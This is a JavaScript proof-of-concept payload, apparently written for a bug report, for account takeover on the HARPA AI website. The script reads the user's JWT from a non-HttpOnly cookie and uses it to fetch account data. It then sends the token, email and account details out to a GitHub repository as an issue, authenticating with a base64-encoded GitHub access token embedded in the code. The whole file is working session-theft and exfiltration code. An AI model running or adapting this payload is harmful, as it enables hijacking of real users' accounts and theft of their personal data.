// HARPA AI Zero-Click ATO - Payload Script
// This script executes in the context of harpa.ai origin

(async () => {
  // === ATTACKER CONFIG ===
  // Base64-encoded GitHub PAT (encode yours: echo -n 'github_pat_xxx' | base64)
  const GH_TOKEN_B64 = "Z2l0aHViX3BhdF8xMUFWVzRLNEEwUGZweXZUU2Y2eUFlX05POGNuajU1MVZZSGIyOVo5dzJOMXFvZTd4dTkzdDgyVHZZTjNERDM4a0pKWExIR0JHTHBkTHRtYlFG";
  const GH_REPO = "dharani-dharan-11023/harpa-poc";

  // Step 1: Steal JWT from non-HttpOnly cookie
  const cookies = document.cookie;
  const jwtMatch = cookies.split(';').find(c => c.trim().startsWith('jwt='));

  if (!jwtMatch) {
    document.body.innerHTML = '<h1 style="color:red">PoC: No JWT found (user not logged in on harpa.ai)</h1>';
    return;
  }

  const jwt = jwtMatch.trim().split('=').slice(1).join('=');
  const payload = JSON.parse(atob(jwt.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')));

  // Step 2: Fetch account data via HARPA API (wildcard CORS allows this)
  let accountData = null;
  let email = "";
  try {
    const resp = await fetch("https://api.harpa.ai/api/v1/auth/account?withBalanceAggregated=true", {
      headers: { "Authorization": "Bearer " + jwt, "Content-Type": "application/json" }
    });
    accountData = await resp.json();
    email = accountData.email || "";
  } catch (e) {}

  // Step 3: Exfiltrate - Create GitHub Issue with stolen data
  try {
    const ghToken = atob(GH_TOKEN_B64);
    await fetch("https://api.github.com/repos/" + GH_REPO + "/issues", {
      method: "POST",
      headers: {
        "Authorization": "Bearer " + ghToken,
        "Content-Type": "application/json",
        "Accept": "application/vnd.github+json"
      },
      body: JSON.stringify({
        title: "Exfiltrated: " + (email || payload.id),
        body: "**Stolen JWT:**\n```\n" + jwt + "\n```\n\n**User ID:** " + payload.id +
              "\n**Email:** " + email +
              "\n**Token Expires:** " + new Date(payload.exp * 1000).toISOString() +
              "\n\n**Account Data:**\n```json\n" + JSON.stringify(accountData, null, 2) + "\n```"
      })
    });
  } catch (e) {}

  // Step 4: Show success on screen
  document.body.innerHTML = `
    <div style="font-family:monospace; background:#1a1a2e; color:#0f0; padding:20px; min-height:100vh;">
      <h1 style="color:#e94560;">HARPA AI - Zero-Click ATO Successful!</h1>
      <h2>Stolen JWT Token:</h2>
      <pre style="background:#16213e; padding:15px; word-break:break-all; color:#e94560; border:1px solid #0f3460;">${jwt}</pre>
      <h2>Decoded Payload:</h2>
      <pre style="background:#16213e; padding:15px; color:#0f0; border:1px solid #0f3460;">${JSON.stringify(payload, null, 2)}</pre>
      <h2>Account Data:</h2>
      <pre style="background:#16213e; padding:15px; color:#0f0; border:1px solid #0f3460;">${accountData ? JSON.stringify(accountData, null, 2) : 'N/A'}</pre>
      <p style="color:#ff0;">Data exfiltrated to GitHub Issues: github.com/${GH_REPO}/issues</p>
      <p style="color:#888;">Origin: ${window.location.origin}</p>
    </div>
  `;
})();
